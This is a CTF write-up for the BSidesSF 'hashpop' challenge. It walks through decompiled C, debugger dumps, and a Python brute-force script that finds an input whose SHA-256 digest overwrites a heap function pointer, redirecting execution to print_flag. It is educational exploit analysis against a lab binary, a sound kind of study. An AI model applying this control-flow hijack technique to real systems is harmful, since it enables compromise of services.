# **hashpop**

#### tag : pwn, web

-----------------------------------------------

#### Description

>Not every pwnable is the same.  Sometimes you can fingerprint them by their hashes, sometimes you can't.

>https://hashpop-b0263f3c.challenges.bsidessf.net

-----------------------------------------------

#### TL;DR

1. get path of /cgi-src/hashpop from `robots.txt`
2. use sha256 or sha512 to overflow
3. use magic hash which is generated by bruteforce

-----------------------------------------------

#### Solution

In https://hashpop-b0263f3c.challenges.bsidessf.net, `hashpop.js` is running on server. And I can find that /cgi-bin/hashpop is target binary. 

```js
$(document).ready(function() {
  if (!(window.File && window.FileReader && window.FileList && window.Blob)) {
    console.error("Missing required API!");
    return;
  }
  $("#hashpop_submit").click(function(e) {
    e.preventDefault();
    var fp = $("#hashpop_source")[0].files[0];
    console.log(fp);
    var fr = new FileReader();
    fr.onload = function() {;
      var data = {
        output: $("#hashpop_format").val(),
        input: fr.result
      };
      $.ajax("/cgi-bin/hashpop", {
        method: 'POST',
        data: data
      }).done(function(data) {
        $("#hashpop_hash").val(data);
      }).fail(function(_, stat) {
        console.error("Error with request: " + stat);
      });
    };
    fr.readAsBinaryString(fp);
  });
});
```

If I post some input data with output type, then server returns hash data. There is anything to do in blind. So I have to get source of hashpop.

```
$ curl -X POST https://hashpop-b0263f3c.challenges.bsidessf.net/cgi-bin/hashpop -d "input=1&output=md5"
c4ca4238a0b923820dcc509a6f75849b
```

Ok, Here is `robots.txt`. There is path `/cgi-src/`. Just download it to analyze.

```
<!-- https://hashpop-b0263f3c.challenges.bsidessf.net/robots.txt -->
User-agent: *
Disallow: /cgi-bin/
Disallow: /cgi-src/
```
```
$ curl https://hashpop-b0263f3c.challenges.bsidessf.net/cgi-src/hashpop > hashpop
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 25284  100 25284    0     0  94334      0 --:--:-- --:--:-- --:--:-- 94343
```

Here is main of hashpop.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    ...
    v3 = malloc(0x28u);
    v4 = (char *)malloc(0x10000u);
    if ( !v3 )
        goto LABEL_68;
    ...
    v6 = fread(v4, 1u, 0x10000u, stdin);
    ...
    v3[2] = "md5";
    v3[3] = "hex";
    v25 = parse_request((int)v3, v5);
    if ( v25 )
        exit(v25);
    if ( !*v3 || (v3[4] = 0, set_hash_and_printer(v3), !v3[4]) )
LABEL_68:
    exit(1);
    exec_hashing(v3);
    print_hash(v3);
    return 0;
}
```

`parse_request()` is too long function, but it's simple that just parse user's request and set hash type and input using strtok and urldecode, there are other parmeters like blog and output but they are not important in actually.

There are 4 paremeters - `input`(plain), `output`(hex or base64), `hash`(hash type), `blog`(just add header in response).


```c
...
do
  {
    v8 = strtok(0, "&");
    if ( !v8 )
    {
      v3 = (char *)*ptr;
LABEL_7:
      v9 = (int)(ptr + 1);
      v101 = (int)&ptr[3 * v7 + 1];
      if ( 3 * (_BYTE)v7 & 1 )
        goto LABEL_8;
      v60 = strchr(v3, 61);
      v61 = ptr + 1;
      if ( !v60 )
        goto LABEL_62;
      v62 = (int)(v60 + 1);
      *v60 = 0;
      v100 = (int)(v60 + 1);
      *v61 = v60 + 1;
      urldecode(v3);
      v63 = v62;
      v64 = v3;
      v67 = urldecode(v63);
      v68 = "output";
      v69 = 7;
      v61 = ptr + 1;
      do
      {
        if ( !v69 )
          break;
        v65 = (unsigned __int8)*v64 < *v68;
        v66 = *v64++ == *v68++;
        --v69;
      }
      while ( v66 );
      ptr[2] = v67;
      v70 = (!v65 && !v66) - v65;
      v71 = 0;
      v72 = v70 == 0;
      if ( v70 )
      {
        v73 = "input";
        v74 = 6;
        v75 = v3;
        do
        {
          if ( !v74 )
            break;
          v71 = (unsigned __int8)*v75 < *v73;
          v72 = *v75++ == *v73++;
          --v74;
        }
        while ( v72 );
        v76 = (!v71 && !v72) - v71;
        v77 = 0;
        v78 = v76 == 0;
        if ( v76 )
        {
          v79 = "hash";
          v80 = v3;
          v81 = 5;
          do
          {
            if ( !v81 )
              break;
            v77 = (unsigned __int8)*v80 < *v79;
            v78 = *v80++ == *v79++;
            --v81;
          }
          while ( v78 );
          v82 = (!v77 && !v78) - v77;
          v83 = 0;
          v84 = v82 == 0;
          if ( v82 )
          {
            v85 = 5;
            v86 = "blog";
            v87 = v3;
            do
            {
              if ( !v85 )
                break;
              v83 = (unsigned __int8)*v87 < *v86;
              v84 = *v87++ == *v86++;
              --v85;
            }
            while ( v84 );
            if ( (!v83 && !v84) == v83 )
            {
              puts("X-WWW-Blog: https://systemoverlord.com/\r");
              v61 = ptr + 1;
            }
          }
          ...
```

`set_hash_and_printer()` is too long too. This function set the hash type, output method and printing function in hash chunk which is allocated in v3. And there are unimplemented hash type(sha1,sha256,sha512) in index page.

If `hash` paremeter in requests is not offered, It will using default function(md5, hex) which is set up in main.

```c
char __cdecl set_hash_and_printer(_DWORD *a1)
{
...

  v1 = 4;
  v2 = (unsigned int)&v94 < 0xC;
  v3 = &v94 == 0;
  v4 = "md5";
  v5 = (_BYTE *)a1[2];
  do
  {
    if ( !v1 )
      break;
    v2 = *v5 < (const unsigned __int8)*v4;
    v3 = *v5++ == *v4++;
    --v1;
  }
  while ( v3 );
  v6 = (!v2 && !v3) - v2;
  v7 = 0;
  v8 = v6 == 0;
  if ( !v6 )
    goto LABEL_81;
  v9 = 4;
  v10 = "MD5";
  v11 = (_BYTE *)a1[2];
  do
  {
    if ( !v9 )
      break;
    v7 = *v11 < (const unsigned __int8)*v10;
    v8 = *v11++ == *v10++;
    --v9;
  }
  while ( v8 );
  v12 = (!v7 && !v8) - v7;
  v13 = 0;
  v14 = v12 == 0;
  if ( v12 )
  {
    v15 = "sha1";
    v16 = (_BYTE *)a1[2];
    v17 = 5;
    ...
    v23 = (_BYTE *)a1[2];
    do
    {
      if ( !v21 )
        break;
      v19 = *v23 < (const unsigned __int8)*v22;
      v20 = *v23++ == *v22++;
      --v21;
    }
    while ( v20 );
    v24 = (!v19 && !v20) - v19;
    v25 = 0;
    v26 = v24 == 0;
    if ( v24 )
    {
      v27 = "sha256";
      v28 = (_BYTE *)a1[2];
      v29 = 7;
      do
      {
        if ( !v29 )
          break;
        v25 = *v28 < (const unsigned __int8)*v27;
        v26 = *v28++ == *v27++;
        --v29;
      }
      ...
        do
        {
          if ( !v39 )
            break;
          v37 = *v41 < (const unsigned __int8)*v40;
          v38 = *v41++ == *v40++;
          --v39;
        }
        while ( v38 );
        v42 = (!v37 && !v38) - v37;
        v43 = 0;
        v44 = v42 == 0;
        if ( !v42 )
          goto LABEL_84;
        v45 = (_BYTE *)a1[2];
        v46 = "SHA512";
        v47 = 7;
        do
        {
          if ( !v47 )
            break;
          v43 = *v45 < (const unsigned __int8)*v46;
          v44 = *v45++ == *v46++;
          --v47;
        }
        while ( v44 );
        LOBYTE(v48) = (!v43 && !v44) - v43;
        if ( (!v43 && !v44) == v43 )
        {
LABEL_84:
          a1[4] = EVP_sha512();
          v48 = a1[3];
          v49 = 0;
          ...
        a1[9] = print_sha1;
      else
LABEL_91:
        a1[9] = print_b64_sha1;
    }
  }
  else
  {
LABEL_81:
    a1[4] = EVP_md5();
    v48 = a1[3];
    v71 = 0;
    v72 = v48 == 0;
    if ( !v48 )
      goto LABEL_88;
    v73 = "base64";
    v74 = 7;
    v75 = (_BYTE *)a1[3];
    do
    {
      if ( !v74 )
        break;
      v71 = *v75 < (const unsigned __int8)*v73;
      v72 = *v75++ == *v73++;
      --v74;
    }
    while ( v72 );
    v76 = (!v71 && !v72) - v71;
    v77 = 0;
    v78 = v76 == 0;
    if ( !v76 )
      goto LABEL_92;
    v79 = (_BYTE *)a1[3];
    v80 = "b64";
    v81 = 4;
    do
    {
      if ( !v81 )
        break;
      v77 = *v79 < (const unsigned __int8)*v80;
      v78 = *v79++ == *v80++;
      --v81;
    }
    while ( v78 );
    LOBYTE(v48) = (!v77 && !v78) - v77;
    if ( (!v77 && !v78) == v77 )
LABEL_92:
      a1[9] = print_b64_md5;
    else
LABEL_88:
      a1[9] = print_md5;
  }
  return v48;
}
```

`exec_hashing` is hashing the input from hash type using EVP function.

```c
int __cdecl exec_hashing(_DWORD *a1)
{
  int v1; // edi

  v1 = EVP_MD_CTX_new();
  EVP_DigestInit_ex(v1, a1[4], 0);
  EVP_DigestUpdate(v1, *a1, a1[1]);
  EVP_DigestFinal_ex(v1, a1 + 5, &md_len_8276);
  return EVP_MD_CTX_free(v1);
}
```

Here is debugging history. v3 is hash chunk, So I checked this chunk's values changing in each function calling.

```
before parse_request()
pwndbg> x/20wx 0x900e160
0x900e160:	0x00000000	0x00000000	0x0804c068	0x0804c0d6
0x900e170:	0x00000000	0x00000000	0x00000000	0x00000000
0x900e180:	0x00000000	0x00000000	0x00000000	0x00010011
0x900e190:	0x75706e69	0x26313d74	0x68736168	0x35646d3d

after parse_request()
pwndbg> x/20wx 0x900e160
0x900e160:	0x0900e196	0x00000001	0x0900e19d	0x0804c0d6
0x900e170:	0x00000000	0x00000000	0x00000000	0x00000000
0x900e180:	0x00000000	0x00000000	0x00000000	0x00010011
0x900e190:	0x75706e69	0x00310074	0x68736168	0x35646d00

after set_hash_and_printer()
pwndbg> x/20wx 0x900e160
0x900e160:	0x0900e196	0x00000001	0x0900e19d	0x0804c0d6
0x900e170:	0xf7eefc00	0x00000000	0x00000000	0x00000000
0x900e180:	0x00000000	0x08049f50	0x00000000	0x00010011
0x900e190:	0x75706e69	0x00310074	0x68736168	0x35646d00

after exec_hashing()
pwndbg> x/20wx 0x900e160
0x900e160:	0x0900e196	0x00000001	0x0900e19d	0x0804c0d6
0x900e170:	0xf7eefc00	0x3842cac4	0x8223b9a0	0x9a50cc0d
0x900e180:	0x9b84756f	0x08049f50	0x00000000	0x00010011
0x900e190:	0x75706e69	0x00310074	0x68736168	0x35646d00

in printer_hash(), call v3[9]
pwndbg> x/20wx $esi
0x900e160:	0x0900e196	0x00000001	0x0900e19d	0x0804c0d6
0x900e170:	0xf7eefc00	0x3842cac4	0x8223b9a0	0x9a50cc0d
0x900e180:	0x9b84756f	0x08049f50	0x00000000	0x00010011
0x900e190:	0x75706e69	0x00310074	0x68736168	0x35646d00
0x900e1a0:	0x00000000	0x00000000	0x00000000	0x00000000
pwndbg> i r esi
esi            0x900e160	151052640
0x804a5e6 <print_hash+38>    call   dword ptr [esi + 0x24] <0x8049f50>

pwndbg> x/i 0x8049f50
   0x8049f50 <print_md5>:	push   ebp
```
```
result in shell
Content-type: text/plain
c4ca4238a0b923820dcc509a6f75849b
```

So, hash chunk(v3)'s struct will be:

```
v3[0] = &input in request
v3[2] = &string for hash type1(md5, sha1, sha256, sha512)        ;default: md5           ;overwritable
v3[3] = &string for hash type2(b64, base64)                      ;default: hex
v3[4] = hash function(evp)                           ;set by set_hash_and_printer()
v3[5] = hash data
v3[9] = print function pointer(print_md5, print_sha1, ...)
```

After some tries, I found if I used `sha256`, binary dead. Oh, there is overflow when using `sha256` in hash. Because `sha256` have 64 hash length, it overwrite v3[9] which is print function pointer.

```
pwndbg> x/20wx 0x9c53160
0x9c53160:	0x09c53196	0x00000001	0x09c5319d	0x0804c0d6
0x9c53170:	0xf7f70e00	0x00000000	0x00000000	0x00000000
0x9c53180:	0x00000000	0x0804a0d0	0x00000000	0x00010011
0x9c53190:	0x75706e69	0x00310074	0x68736168	0x61687300


pwndbg> x/20wx 0x9c53160
0x9c53160:	0x09c53196	0x00000001	0x09c5319d	0x0804c0d6
0x9c53170:	0xf7f70e00	0x73b2866b	0xe1fc34ff	0x4e806b9d
0x9c53180:	0x573f5aff	0xeaa4ad47	0x491d2fa2	0xdd521ec0
0x9c53190:	0x4b5b87b7	0x00310074	0x68736168	0x61687300

Program received signal SIGSEGV (fault address 0xeaa4ad47)
pwndbg> i r eip
eip            0xeaa4ad47	0xeaa4ad47
```

So, how to use it? I have to find magic hash that hash[16:20] will be `&print_flag`. Yes, It takes a very long times. In ma case, I spent 1 hours for getting magic hash.

I get the input `fb18592c3edca00d1c7a61124166dfe7ed2d1a840b570c55efb7a897ea25870f` which is generate sha256 `2af06d3ae24ae97a0067182f4a50b136d0ab0408b5214820909021e77aabb5ee`.

```python
def generate_sha256(s):
    elf = ELF('./hashpop')
    offsets = [ elf.symbols['print_flag'], elf.symbols['print_flag_json'], elf.symbols['print_flag_xml']]

    while True:
        h = hashlib.sha256()
        h.update(str(s))
        c = u32((h.digest())[0x10:0x10+4])
        if c in offsets:
            log.info('found hash for control eip: %s(%s)' % (str(s), h.hexdigest()))
            return 0
        s = str(h.hexdigest())
```
```
[*] found hash for control eip: fb18592c3edca00d1c7a61124166dfe7ed2d1a840b570c55efb7a897ea25870f(2af06d3ae24ae97a0067182f4a50b136d0ab0408b5214820909021e77aabb5ee)
```

This input overwrite function pointer area and call print_flag_json!

```
pwndbg> x/20wx 0x85bd160
0x85bd160:	0x085bd196	0x00000040	0x085bd1dc	0x0804c0d6
0x85bd170:	0xf7f0fe00	0x3a6df02a	0x7ae94ae2	0x2f186700
0x85bd180:	0x36b1504a	0x0804abd0	0x204821b5	0xe7219090
0x85bd190:	0xeeb5ab7a	0x62660074	0x39353831	0x65336332

pwndbg> i r eip
eip            0x804abd0	0x804abd0 <print_flag_json>
```

Ok, Here is [solution script](./solve.py) using requests module.

```
$ python solve.py
{'Via': '1.1 google', 'Content-Encoding': 'gzip', 'Transfer-Encoding': 'chunked', 'Vary': 'Accept-Encoding', 'Server': 'Apache/2.4.38 (Debian)', 'Date': 'Thu, 27 Feb 2020 12:02:10 GMT', 'Alt-Svc': 'clear', 'Content-Type': 'text/plain'}
Content-type: application/json

{"flag": "CTF{it_couldve_been_64_bit!}
"}
```
**CTF{it_couldve_been_64_bit!}**